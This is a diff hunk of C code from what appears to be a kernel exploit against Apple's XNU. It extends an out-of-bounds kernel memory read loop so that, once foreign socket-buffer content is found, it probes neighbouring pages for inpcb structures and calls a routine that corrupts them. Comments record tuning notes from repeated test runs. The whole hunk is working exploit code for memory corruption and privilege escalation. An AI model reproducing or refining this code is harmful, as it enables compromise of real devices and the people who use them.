@@ -204,26 +204,64 @@ kern_return_t cs2_pe_v1(void) {
                mapping first (boot-recurrence law: 0xba0000 recurs across
                boots, 0x57c0000 x3 same page-id). Receipt line per probe;
                a hit goes straight to the pcb hunt. Falls through to the
-               unchanged linear sweep with the table logged. */
+               unchanged linear sweep with the table logged.
+               v15 chain law (2026-11-15 receipts): the hit window reads
+               WHOLESALE foreign socket-buffer content with kptr=0 — the
+               inpcb pair lives at a NEIGHBOR page, not inside the window.
+               On a foreign hit: probe +-3 page neighbors, hunt each, then
+               SKIP the blind sweep for this mapping (tonight's sweep froze
+               past deadline with the target layer already proven). */
+            int lswProven = 0;
             for (int li = 0; li < g_lsw_wrong_n; li++) {
                 size_t lt = (size_t)(g_lsw_wrong_offs[li] & ~((uint64_t)vm_page_size - 1));
                 if (lt >= search_mapping_size) continue;
                 kern_return_t lkr = cs2_oob_read(memory_object, lt, cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
+                uint64_t lq0 = ((uint64_t *)read_buffer)[0];
                 LOG("[lswarm] map=%lu off=0x%zx kr=%#x q0=%016llx q1=%016llx",
                     s, lt, lkr,
-                    (unsigned long long)((uint64_t *)read_buffer)[0],
+                    (unsigned long long)lq0,
                     (unsigned long long)((uint64_t *)read_buffer)[1]);
                 if (lkr == KERN_SUCCESS &&
                     cs2_find_and_corrupt(memory_object, lt, read_buffer, write_buffer,
                                          target_inp_gencnt_list, &target_inp_gencnt_count, false)
                         == KERN_SUCCESS) {
                     success = true;
+                    break;
+                }
+                /* foreign content (not our marker) = target layer proven */
+                if (lkr == KERN_SUCCESS && lq0 != cs2_ctx.random_marker) {
+                    lswProven = true;
+                    for (int nb = -3; nb <= 3 && !success; nb++) {
+                        if (nb == 0) continue;
+                        int64_t nt = (int64_t)lt + (int64_t)nb * (int64_t)vm_page_size;
+                        if (nt < 0 || (uint64_t)nt >= search_mapping_size) continue;
+                        kern_return_t nkr = cs2_oob_read(memory_object, (size_t)nt,
+                                                         cs2_ctx.oob_size, cs2_ctx.oob_offset, read_buffer);
+                        uint64_t nq0 = ((uint64_t *)read_buffer)[0];
+                        LOG("[lswarm-nb] map=%lu off=0x%llx kr=%#x q0=%016llx krange=%d",
+                            s, (unsigned long long)nt, nkr,
+                            (unsigned long long)nq0,
+                            (nq0 >> 48) >= 0xffff);
+                        if (nkr == KERN_SUCCESS &&
+                            cs2_find_and_corrupt(memory_object, (size_t)nt, read_buffer, write_buffer,
+                                                 target_inp_gencnt_list, &target_inp_gencnt_count, false)
+                                == KERN_SUCCESS) {
+                            success = true;
+                        }
+                    }
+                    break;   /* one proven window per mapping is the receipt */
                 }
             }
             if (success) break;
 
             // start the party
             uint64_t seeking_offset = 0;
+            /* v15 freeze law: target layer proven + pcb hunt ran — the blind
+               sweep adds nothing and burned the deadline (22:47 receipts) */
+            if (lswProven) {
+                LOG("[lswarm] map=%lu target layer PROVEN, pcb neighborhood hunted — sweep skipped", s);
+                seeking_offset = search_mapping_size;
+            }
 
             // seeking offset increases by page_size, until search_mapping_size
             // since search_mapping_size is 0x8000000, we can loop 0x2000 times
